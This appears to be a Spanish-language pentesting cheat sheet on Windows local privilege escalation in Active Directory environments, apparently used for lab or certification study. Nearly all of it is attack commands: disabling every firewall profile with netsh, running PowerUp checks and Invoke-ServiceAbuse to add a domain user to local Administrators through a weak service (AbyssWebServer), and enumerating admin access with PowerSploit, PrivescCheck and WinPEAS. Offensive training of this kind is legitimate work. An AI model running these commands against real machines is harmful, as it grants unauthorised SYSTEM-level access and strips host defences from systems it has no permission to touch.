# Local Privilege Escalation (Enumeración)

Tags: #AD #Windows #Powershell #PrivEsc #PowerUp #WinPeas #PowerSploit #FirewallOff 

## Una vez siendo Admin desactivar Protección (Firewall)

```powershell 
❯ netsh advfirewall set allprofiles state off
```

## PowerUP

* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

```powershell
❯ . C:\AD\PowerUp.ps1    # Cargar la tool 

❯ Invoke-Allchecks       # Ejecutar todas las comprobaciones de escalación local del script
```

```powershell 
❯ Get-ServiceUnquoted -Verbose          # Obtener servicios con rutas entre comillas y un espacio en sus nombres 
❯ Get-ModifiableServiceFile -Verbose    # Obtener servicios donde el usuario actual puede escribir en su ruta binaria o cambiar los argumentos del binario 
❯ Get-ModifiableService -Verbose        # Obtener los servicios cuya configuración puede modificar el usuario actual 
```
### PowerUp - privEsc local (Forma 1) 

```powershell
# Si se encuentra un servicio corriendo en el escaneo de PowerUp y tiene estas características (AbuseFunction, CanRestart y Check) de la siguiente manera, se podría abusar para escalar privilegios:

	ServiceName:  
	Path: 
	StartName: 
	AbuseFunction: Invoke-ServiceAbuse -Name 'ServiceName'
	CanRestart: True
	Name: 
	Check: Modifiable Services 


❯ help Invoke-ServiceAbuse      # Mirar ejemplos de los diferentes comandos
	# Agregar al usuario actual del dominio al grupo de administrador local  
	❯ Invoke-ServiceAbuse -Name 'ServiceName' -Username "domain\user" -Verbose
	❯ net localgroup Administrators  # Mirar el grupo local administrators


Nota: 
	- Despues de agregar el usuario al grupo se debe salir y volver a iniciar sesión
```

### Abusar del servicio AByssWebServer encontrado en PowerUP

```powershell 
# PowerUp
❯ Invoke-AllChecks
# Ejecuta todos los checks de escalación de privilegios locales de PowerSploit/PowerUp. Identifica servicios con rutas sin comillas (Unquoted Service Path), servicios cuya configuración puede ser modificada por el usuario actual (weak service permissions), binarios de servicios reemplazables, tareas programadas mal configuradas, entre otros vectores comunes de privesc en Windows.

# Servicios clave para escalar 
1 AbyssWebServer con Check: 'Unquoted service paths' 
2 AbyssWebServer con Check: 'Modifiable Service Files' y CanRestart: 'True'
3 StartName: LocalSystem 
4 ModifiableFileIdentityReference: Everyone 

---  Hacer el abuso  ---
❯ Invoke-ServiceAbuse -Name AbyssWebServer -Username 'dominio\usuario'
# Abusa de un servicio con permisos débiles para agregar un usuario al grupo local de administradores. Modifica el binPath del servicio para ejecutar un comando arbitrario como SYSTEM.

❯ net localgroup Administrators   # Verificar que hemos sido agregado al grupo Administrators 

NOTA: Requiere cerrar sesión y volver a autenticarse para que sean asignados los nuevos permisos en memoria  
```

## PowerSploit - Recon servers DC

```powershell 
❯ . Find-PSRemotingLocalAdminAccess.ps1       # Importar el módulo 
❯ Find-PSRemotingLocalAdminAccess -Verbose    # Listar servidores del DC donde se tiene acceso administrativo local 
```

## Privesc 

* [Privesc](https://github.com/itm4n/PrivescCheck)

```powershell 
# Es similar a PowerUp, pero más moderno y más detallado en auditoría

❯ Invoke-PrivEscCheck 
```

## WinPEAS 

* [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

```powershell 
# Es un binario compilado en C#

❯ winPEASx64.exe    
```

